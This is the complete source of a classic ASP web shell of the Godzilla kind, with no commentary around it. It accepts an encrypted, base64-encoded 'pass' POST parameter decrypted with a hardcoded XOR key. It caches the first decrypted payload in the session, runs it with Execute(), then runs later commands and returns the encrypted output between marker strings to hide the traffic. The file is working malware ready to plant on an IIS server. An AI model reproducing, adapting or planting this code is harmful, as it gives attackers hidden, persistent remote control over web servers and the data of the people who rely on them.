<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    key="3c6e0b8a9c15224a"
    content=request.Form("pass")
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(Base64Decode(content),false)
            Session("payload")=content
            response.End
        else
            content=decryption(Base64Decode(content),true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            response.Write("11cd6a")
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write("ac826a")
        end if
    end if
%>
